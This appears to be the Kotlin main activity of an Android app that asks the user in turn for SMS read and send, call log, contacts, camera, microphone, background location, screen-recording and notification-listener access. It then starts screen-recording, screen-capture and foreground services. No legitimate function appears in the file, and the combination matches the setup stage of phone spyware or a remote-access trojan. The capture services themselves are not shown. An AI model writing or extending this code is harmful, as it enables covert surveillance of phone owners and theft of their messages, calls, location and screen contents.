package com.kashem.shaikh

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class MainActivity : AppCompatActivity() {

    private var permissionStep = 0
    private var waitingForNotification = false

    // Explicit type declaration to avoid recursion
    private val allPermissions: Array<String> = mutableListOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.SEND_SMS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    // Explicit type for launcher
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grantResults: Map<String, Boolean> ->
        val allGranted = grantResults.values.all { it }
        if (allGranted) {
            Toast.makeText(this, "✅ All dangerous permissions granted", Toast.LENGTH_SHORT).show()
            proceedToNextPermission()
        } else {
            val deniedList = grantResults.filter { !it.value }.keys
            Toast.makeText(this, "⚠️ Permissions denied: $deniedList. Some features may not work.", Toast.LENGTH_LONG).show()
            proceedToNextPermission()
        }
    }

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            ForegroundService.setMediaProjectionForScreen(result.resultCode, result.data!!)
            ScreenRecorder.setMediaProjection(result.resultCode, result.data!!)
            ScreenCaptureService.setMediaProjection(result.resultCode, result.data!!)
            Toast.makeText(this, "✅ Screen record permission granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "❌ Screen record permission denied", Toast.LENGTH_SHORT).show()
        }
        proceedToNextPermission()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            v.setPadding(
                insets.getInsets(WindowInsetsCompat.Type.systemBars()).left,
                insets.getInsets(WindowInsetsCompat.Type.systemBars()).top,
                insets.getInsets(WindowInsetsCompat.Type.systemBars()).right,
                insets.getInsets(WindowInsetsCompat.Type.systemBars()).bottom
            )
            insets
        }

        permissionStep = 0
        waitingForNotification = false
        requestNextPermission()
    }

    override fun onResume() {
        super.onResume()
        if (waitingForNotification && isNotificationListenerEnabled()) {
            waitingForNotification = false
            Toast.makeText(this, "✅ Notification access granted", Toast.LENGTH_SHORT).show()
            proceedToNextPermission()
        }
    }

    private fun requestNextPermission() {
        when (permissionStep) {
            0 -> {
                val ungranted: Array<String> = allPermissions.filter {
                    ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                }.toTypedArray()
                if (ungranted.isEmpty()) {
                    Toast.makeText(this, "All dangerous permissions already granted", Toast.LENGTH_SHORT).show()
                    proceedToNextPermission()
                } else {
                    permissionLauncher.launch(ungranted)
                }
            }
            1 -> {
                Handler(Looper.getMainLooper()).postDelayed({
                    requestScreenRecordPermission()
                }, 500)
            }
            2 -> {
                checkNotificationListenerPermission()
            }
            else -> {
                startServices()
                Toast.makeText(this, "✅ All permissions granted. Services started.", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun proceedToNextPermission() {
        permissionStep++
        requestNextPermission()
    }

    private fun requestScreenRecordPermission() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(projectionManager.createScreenCaptureIntent())
    }

    private fun checkNotificationListenerPermission() {
        if (isNotificationListenerEnabled()) {
            Toast.makeText(this, "✅ Notification access already granted", Toast.LENGTH_SHORT).show()
            proceedToNextPermission()
        } else {
            waitingForNotification = true
            Toast.makeText(this, "Please enable notification access for this app", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val componentName = ComponentName(this, NotificationCaptureService::class.java).flattenToString()
        return enabled?.contains(componentName) == true
    }

    private fun startServices() {
        startService(Intent(this, ForegroundService::class.java))
        startService(Intent(this, ScreenRecorder::class.java))
        startService(Intent(this, ScreenCaptureService::class.java))
    }
}